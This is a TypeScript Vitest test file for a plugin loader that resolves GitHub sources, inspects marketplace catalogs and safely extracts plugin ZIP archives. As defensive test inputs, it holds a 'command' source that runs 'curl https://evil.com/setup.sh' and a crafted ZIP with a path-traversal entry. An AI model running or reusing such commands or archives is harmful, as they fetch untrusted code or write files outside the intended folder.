import { describe, expect, it, vi } from "vitest";
import { archiveEntries } from "../src/github-archive.ts";
import {
	canonicalizeRepository,
	computePluginId,
	fetchPluginFiles,
	inspectRepositorySource,
	isSourceSupported,
	resolveCommitSha,
} from "../src/plugin-sources.ts";

function crc32(bytes: Buffer): number {
	let crc = 0xffffffff;
	for (const byte of bytes) {
		crc ^= byte;
		for (let bit = 0; bit < 8; bit += 1) crc = (crc >>> 1) ^ (crc & 1 ? 0xedb88320 : 0);
	}
	return (crc ^ 0xffffffff) >>> 0;
}

function createZip(entries: Record<string, string | { readonly content: string; readonly mode: number }>): Buffer {
	const local: Buffer[] = [];
	const central: Buffer[] = [];
	let offset = 0;
	for (const [name, value] of Object.entries(entries)) {
		const fileName = Buffer.from(name);
		const bytes = Buffer.from(typeof value === "string" ? value : value.content);
		const mode = typeof value === "string" ? 0o100600 : value.mode;
		const checksum = crc32(bytes);
		const header = Buffer.alloc(30);
		header.writeUInt32LE(0x04034b50, 0);
		header.writeUInt16LE(20, 4);
		header.writeUInt32LE(checksum, 14);
		header.writeUInt32LE(bytes.length, 18);
		header.writeUInt32LE(bytes.length, 22);
		header.writeUInt16LE(fileName.length, 26);
		local.push(header, fileName, bytes);

		const directory = Buffer.alloc(46);
		directory.writeUInt32LE(0x02014b50, 0);
		directory.writeUInt16LE(0x0314, 4);
		directory.writeUInt16LE(20, 6);
		directory.writeUInt32LE(checksum, 16);
		directory.writeUInt32LE(bytes.length, 20);
		directory.writeUInt32LE(bytes.length, 24);
		directory.writeUInt16LE(fileName.length, 28);
		directory.writeUInt32LE((mode << 16) >>> 0, 38);
		directory.writeUInt32LE(offset, 42);
		central.push(directory, fileName);
		offset += header.length + fileName.length + bytes.length;
	}
	const directoryBytes = Buffer.concat(central);
	const end = Buffer.alloc(22);
	end.writeUInt32LE(0x06054b50, 0);
	end.writeUInt16LE(Object.keys(entries).length, 8);
	end.writeUInt16LE(Object.keys(entries).length, 10);
	end.writeUInt32LE(directoryBytes.length, 12);
	end.writeUInt32LE(offset, 16);
	return Buffer.concat([...local, directoryBytes, end]);
}

describe("canonicalizeRepository & computePluginId", () => {
	it("normalizes github URLs and shorthands", () => {
		expect(canonicalizeRepository("https://github.com/owner/repo.git").canonicalRepository).toBe(
			"https://github.com/owner/repo",
		);
		expect(canonicalizeRepository("owner/repo").canonicalRepository).toBe("https://github.com/owner/repo");
		expect(canonicalizeRepository("https://github.com/Owner/Repo/tree/main/plugins/x").canonicalRepository).toBe(
			"https://github.com/owner/repo",
		);
	});

	it("computes stable plugin IDs from canonical repo and subdir", () => {
		const id1 = computePluginId("https://github.com/Owner/Repo", "./plugins/foo/");
		const id2 = computePluginId("https://github.com/owner/repo", "plugins/foo");
		expect(id1).toBe(id2);
		expect(id1).toMatch(/^[a-f0-9]{64}$/);
	});
});

describe("isSourceSupported", () => {
	it("identifies supported and unsupported plugin sources", () => {
		expect(isSourceSupported("./plugins/formatter")).toBe(true);
		expect(isSourceSupported({ source: "local", path: "./plugins/x" })).toBe(true);
		expect(isSourceSupported({ source: "github", repo: "anthropics/claude-plugins" })).toBe(true);
		expect(isSourceSupported({ source: "url", url: "https://github.com/owner/repo" })).toBe(true);
		expect(isSourceSupported({ source: "git-subdir", url: "https://github.com/owner/repo", path: "sub/dir" })).toBe(
			true,
		);

		// Unsupported
		expect(isSourceSupported("https://gitlab.com/owner/repo")).toBe(false);
		expect(isSourceSupported({ source: "npm", package: "claude-plugin-foo" })).toBe(false);
		expect(isSourceSupported({ source: "pip", package: "codex-plugin-foo" })).toBe(false);
		expect(isSourceSupported({ source: "command", run: "curl https://evil.com/setup.sh" })).toBe(false);
	});
});

describe("inspectRepositorySource", () => {
	const MARKET_COMMIT = "1111111111111111111111111111111111111111";

	it("discovers Claude marketplace catalog without downloading external plugins", async () => {
		const marketplaceJson = JSON.stringify({
			name: "official-market",
			plugins: [
				{
					name: "local-plugin",
					description: "Local subdir plugin",
					source: "./plugins/local",
				},
				{
					name: "github-plugin",
					description: "External github plugin",
					source: {
						source: "github",
						repo: "acme/external-plugin",
						sha: "2222222222222222222222222222222222222222",
					},
				},
				{
					name: "url-plugin",
					description: "External url plugin",
					source: {
						source: "url",
						url: "https://github.com/acme/url-plugin",
						ref: "main",
					},
				},
				{
					name: "subdir-plugin",
					description: "External git subdir plugin",
					source: {
						source: "git-subdir",
						url: "https://github.com/acme/mono-repo",
						path: "plugins/nested",
					},
				},
				{
					name: "unsupported-plugin",
					description: "NPM plugin",
					source: {
						source: "npm",
						package: "something",
					},
				},
			],
		});

		const fetchCalls: string[] = [];
		const fetchImpl = vi.fn(async (input: string | URL | Request) => {
			const url = String(input);
			fetchCalls.push(url);
			if (url.endsWith("/repos/anthropics/claude-plugins-official")) {
				return new Response(JSON.stringify({ default_branch: "main" }));
			}
			if (url.endsWith("/commits/main")) {
				return new Response(JSON.stringify({ sha: MARKET_COMMIT }));
			}
			if (url.includes("/contents/.claude-plugin/marketplace.json")) {
				return new Response(marketplaceJson);
			}
			return new Response(null, { status: 404 });
		}) as typeof fetch;

		const inspected = await inspectRepositorySource("anthropics/claude-plugins-official", fetchImpl);
		expect(inspected.isMarketplace).toBe(true);
		expect(inspected.commit).toBe(MARKET_COMMIT);
		expect(inspected.catalog).toHaveLength(5);

		expect(inspected.catalog[0]).toMatchObject({
			name: "local-plugin",
			formatHint: "claude",
			sourceSupported: true,
		});
		expect(inspected.catalog[1]).toMatchObject({
			name: "github-plugin",
			formatHint: "claude",
			sourceSupported: true,
		});
		expect(inspected.catalog[4]).toMatchObject({
			name: "unsupported-plugin",
			sourceSupported: false,
		});

		// CRITICAL: Ensure NO external repo downloads were triggered during catalog inspection!
		expect(fetchCalls.some((call) => call.includes("codeload.github.com"))).toBe(false);
		expect(fetchCalls.some((call) => call.includes("external-plugin"))).toBe(false);
	});

	it("resolves branch containing slashes when inspecting repository route", async () => {
		const commit = "3333333333333333333333333333333333333333";
		const pluginJson = JSON.stringify({ name: "branch-plugin" });

		const fetchImpl = vi.fn(async (input: string | URL | Request) => {
			const url = String(input);
			if (url.endsWith("/commits/feature")) return new Response(null, { status: 404 });
			if (url.endsWith("/commits/feature%2Ftest-branch")) {
				return new Response(JSON.stringify({ sha: commit }));
			}
			if (url.includes("/contents/plugins/my-plugin/.claude-plugin/marketplace.json")) {
				return new Response(null, { status: 404 });
			}
			if (url.includes("/contents/plugins/my-plugin/.agents/plugins/marketplace.json")) {
				return new Response(null, { status: 404 });
			}
			if (url.includes("/contents/plugins/my-plugin/.claude-plugin/plugin.json")) {
				return new Response(pluginJson);
			}
			return new Response(null, { status: 404 });
		}) as typeof fetch;

		const inspected = await inspectRepositorySource(
			"https://github.com/acme/repo/tree/feature/test-branch/plugins/my-plugin",
			fetchImpl,
		);
		expect(inspected.commit).toBe(commit);
		expect(inspected.root).toBe("plugins/my-plugin");
		expect(inspected.catalog).toHaveLength(1);
		expect(inspected.catalog[0].name).toBe("branch-plugin");
	});
});

describe("fetchPluginFiles", () => {
	const origin = {
		canonicalRepository: "https://github.com/acme/marketplace",
		owner: "acme",
		repo: "marketplace",
		commit: "1111111111111111111111111111111111111111",
		root: "",
	};

	it("fetches relative subdir plugin from market repo zip", async () => {
		const zipBuffer = createZip({
			"marketplace-1111111111111111111111111111111111111111/plugins/formatter/.claude-plugin/plugin.json":
				JSON.stringify({ name: "formatter" }),
			"marketplace-1111111111111111111111111111111111111111/plugins/formatter/skills/fmt/SKILL.md":
				"---\nname: fmt\n---\nFmt body",
			"marketplace-1111111111111111111111111111111111111111/plugins/other/unused.txt": "ignore",
		});

		const fetchImpl = vi.fn(async (input: string | URL | Request) => {
			const url = String(input);
			if (url.includes("codeload.github.com/acme/marketplace/zip/1111111111111111111111111111111111111111")) {
				return new Response(zipBuffer);
			}
			return new Response(null, { status: 404 });
		}) as typeof fetch;

		const result = await fetchPluginFiles(
			origin,
			{
				id: "entry-formatter",
				name: "formatter",
				description: "Formatter",
				formatHint: "claude",
				sourceSupported: true,
				source: "./plugins/formatter",
			},
			fetchImpl,
		);

		expect(result.subdir).toBe("plugins/formatter");
		expect(result.files.has(".claude-plugin/plugin.json")).toBe(true);
		expect(result.files.has("skills/fmt/SKILL.md")).toBe(true);
		expect(result.files.has("plugins/other/unused.txt")).toBe(false);
	});

	it("fetches external github plugin with fixed sha prioritized over ref", async () => {
		const targetSha = "5555555555555555555555555555555555555555";
		const zipBuffer = createZip({
			[`ext-${targetSha}/.claude-plugin/plugin.json`]: JSON.stringify({ name: "external" }),
		});

		const fetchCalls: string[] = [];
		const fetchImpl = vi.fn(async (input: string | URL | Request) => {
			const url = String(input);
			fetchCalls.push(url);
			if (url.includes(`codeload.github.com/external-owner/external-repo/zip/${targetSha}`)) {
				return new Response(zipBuffer);
			}
			return new Response(null, { status: 404 });
		}) as typeof fetch;

		const result = await fetchPluginFiles(
			origin,
			{
				id: "entry-external",
				name: "external",
				description: "External",
				formatHint: "claude",
				sourceSupported: true,
				source: {
					source: "github",
					repo: "external-owner/external-repo",
					ref: "main",
					sha: targetSha,
				},
			},
			fetchImpl,
		);

		expect(result.commit).toBe(targetSha);
		expect(result.files.has(".claude-plugin/plugin.json")).toBe(true);
		// With fixed sha, it must NOT call GitHub API to resolve ref!
		expect(fetchCalls.some((c) => c.includes("/commits/"))).toBe(false);
	});
});

describe("ZIP security, symlink, limits, and error handling", () => {
	it("rejects path traversal in ZIP entry", async () => {
		const maliciousZip = createZip({
			"root/../evil.txt": "malicious content",
		});
		await expect(archiveEntries(maliciousZip, { stripRoot: true })).rejects.toThrow();
	});

	it("skips symlinks when skipNonRegular is true, and preserves executable bit on normal files", async () => {
		const zipWithSymlink = createZip({
			"root/normal.txt": "regular content",
			"root/script.sh": { content: "#!/bin/sh", mode: 0o100755 },
			"root/symlink": { content: "target", mode: 0o120777 },
		});
		const extracted = await archiveEntries(zipWithSymlink, { stripRoot: true, skipNonRegular: true });
		expect(extracted).toHaveLength(2);
		const scriptEntry = extracted.find((e) => e.path === "script.sh");
		expect(scriptEntry?.mode).toBe(0o700);
		const normalEntry = extracted.find((e) => e.path === "normal.txt");
		expect(normalEntry?.mode).toBe(0o600);
	});

	it("rejects archive exceeding max uncompressed size", async () => {
		const zipLarge = createZip({
			"root/huge.txt": "x".repeat(1024),
		});
		await expect(archiveEntries(zipLarge, { stripRoot: true, maxUncompressedBytes: 500 })).rejects.toThrow();
	});

	it("handles 429 rate limiting with retry, and throws on persistent failure", async () => {
		let attempts = 0;
		const fetchImpl = vi.fn(async () => {
			attempts += 1;
			return new Response(null, { status: 429 });
		}) as typeof fetch;

		await expect(resolveCommitSha(fetchImpl, "owner", "repo", "main")).rejects.toThrow();
		expect(attempts).toBe(2);
	});

	it("throws on 404 missing repository", async () => {
		const fetchImpl = vi.fn(async () => new Response(null, { status: 404 })) as typeof fetch;
		await expect(resolveCommitSha(fetchImpl, "owner", "missing-repo", "main")).rejects.toThrow();
	});
});
